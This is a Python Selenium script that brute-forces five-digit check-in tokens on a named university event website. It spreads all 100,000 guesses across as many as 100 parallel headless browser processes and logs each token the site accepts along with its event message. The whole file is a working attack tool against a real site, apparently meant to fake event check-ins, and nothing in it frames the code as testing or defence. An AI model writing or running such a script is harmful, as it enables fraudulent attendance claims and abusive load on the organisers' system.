import multiprocessing
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

chrome_options = Options()
chrome_options.add_argument("--headless") 

def brute_force_token(start_token, end_token):
    driver = webdriver.Chrome(options=chrome_options)

    # URL da página de check-in
    url = "https://poliweek.ep.pucpr.br/check-in/"
    
    driver.get(url)
    
    email_element = WebDriverWait(driver, 10).until(
        EC.visibility_of_element_located((By.XPATH, '/html/body/div/form/div/div[2]/input'))
    )
    
    senha_element = driver.find_element(By.XPATH, '/html/body/div/form/div/div[3]/input')
    email_element.send_keys("")
    senha_element.send_keys("")

    for token in range(start_token, end_token):
        token_str = str(token).zfill(5)

        token_element = driver.find_element(By.XPATH, '/html/body/div/form/div/div[4]/input')
        token_element.clear()
        token_element.send_keys(token_str)

        checkin_button = driver.find_element(By.XPATH, '/html/body/div/form/div/div[5]')
        checkin_button.click()

        message_element = WebDriverWait(driver, 10).until(
            EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[2]'))
        )
        message_text = message_element.text

        if "Token incorreto!" in message_text:
            pass
        else:
            print(f"Token correto encontrado: {token_str}")
            with open("tokens_validos.log", "a") as log_file:
                log_file.write(f"Token válido: {token_str}; evento: {message_text}\n")

        close_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "/html/body/div/div/div/div[1]/div/i"))
        )
        close_button.click()

    driver.quit()

def run_bruteforce_in_parallel(num_processes=10, token_range=(0, 100000)):
    start_token, end_token = token_range
    total_tokens = end_token - start_token
    tokens_per_process = total_tokens // num_processes # 100.000 // 10 = 10.000
    
    processes = []

    for i in range(num_processes):
        process_start_token = start_token + i * tokens_per_process # 0 + 1 * 100.000 = 100.000
        process_end_token = process_start_token + tokens_per_process # 100.000 + 100.000 = 200.000

        if i == num_processes - 1:
            process_end_token = end_token

        process = multiprocessing.Process(target=brute_force_token, args=(process_start_token, process_end_token))
        processes.append(process)
        process.start()

    for process in processes:
        process.join()

if __name__ == "__main__":
    run_bruteforce_in_parallel(num_processes=100)
